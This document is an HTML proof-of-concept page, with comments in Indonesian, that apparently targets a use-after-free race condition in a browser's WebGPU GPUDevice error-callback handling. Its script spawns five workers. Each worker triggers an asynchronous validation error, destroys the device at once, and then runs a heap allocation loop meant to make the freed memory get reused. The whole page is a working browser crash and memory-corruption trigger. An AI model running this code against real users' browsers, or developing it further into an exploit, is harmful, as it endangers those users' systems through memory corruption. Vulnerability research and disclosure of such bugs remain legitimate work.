<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebGPU UAF PoC Trigger</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; height: 300px; overflow-y: scroll; background: #000; }
    </style>
</head>
<body>
    <h1>WebGPU UAF/Race Condition Trigger</h1>
    <p>Target: GPUDevice::OnUncapturedErrorImpl Race Condition</p>
    <button id="startBtn">Start Trigger Loop</button>
    <div class="log" id="consoleLog"></div>

    <script>
        const logDiv = document.getElementById('consoleLog');
        function log(msg) {
            const p = document.createElement('div');
            p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.appendChild(p);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // Worker Script Blob
        // Ini adalah kode yang akan dijalankan di thread terpisah untuk memicu 
        // IsWebGPUMultithreadedWorker logic di C++.
        const workerScript = `
            self.onmessage = async function(e) {
                if (!navigator.gpu) {
                    self.postMessage({type: 'log', msg: 'WebGPU not supported in this browser/worker.'});
                    return;
                }

                try {
                    const adapter = await navigator.gpu.requestAdapter();
                    if (!adapter) {
                        self.postMessage({type: 'log', msg: 'No adapter found.'});
                        return;
                    }
                    
                    const device = await adapter.requestDevice();
                    self.postMessage({type: 'log', msg: 'Device created. ID: ' + e.data.id});

                    // 1. Setup Listener untuk menangkap error async
                    // Callback ini yang kita harapkan berjalan SETELAH destroy()
                    device.addEventListener('uncapturederror', (event) => {
                        // Jika UAF terjadi, akses ke properti internal di sini atau 
                        // mekanisme dispatch event itu sendiri mungkin crash browser.
                        self.postMessage({type: 'log', msg: 'Callback fired for: ' + event.error.message});
                    });

                    // 2. Lakukan operasi Invalid untuk memicu Error Callback
                    // Kita membuat buffer dengan usage 0 (invalid) atau size yang aneh
                    // Operasi ini async di backend (GPU Process -> IO Thread -> Worker Thread)
                    try {
                        device.createBuffer({
                            size: 1024,
                            usage: 0 // Usage 0 biasanya invalid dan men-trigger validation error
                        });
                    } catch(err) {
                        // Error synchronous diabaikan, kita cari yang async
                    }

                    // 3. SEGERA hancurkan device
                    // Tujuannya: Objek C++ GPUDevice masuk state destroyed/free
                    // sementara pesan error dari GPU Process sedang dalam perjalanan (in-flight).
                    device.destroy();
                    self.postMessage({type: 'log', msg: 'Device destroyed immediately.'});

                    // 4. Allocation Pressure (Opsional)
                    // Mencoba memicu Garbage Collection segera untuk membersihkan memori
                    // agar Use-After-Free lebih mungkin terjadi (mengisi slot memori yang kosong).
                    const trash = [];
                    for(let i = 0; i < 10000; i++) {
                        trash.push(new ArrayBuffer(1024));
                    }

                } catch (error) {
                    self.postMessage({type: 'log', msg: 'Worker Error: ' + error});
                }
            };
        `;

        const blob = new Blob([workerScript], { type: 'application/javascript' });
        const workerUrl = URL.createObjectURL(blob);

        document.getElementById('startBtn').addEventListener('click', () => {
            log("Spawning Workers to race destroy() vs callbacks...");
            
            // Kita spawn beberapa worker sekaligus untuk meningkatkan peluang race condition
            for (let i = 0; i < 5; i++) {
                const worker = new Worker(workerUrl);
                worker.onmessage = (e) => {
                    if (e.data.type === 'log') log(`[Worker ${i}] ${e.data.msg}`);
                };
                worker.postMessage({ id: i });
                
                // Cleanup worker setelah beberapa saat
                setTimeout(() => worker.terminate(), 2000);
            }
        });
    </script>
</body>
</html>
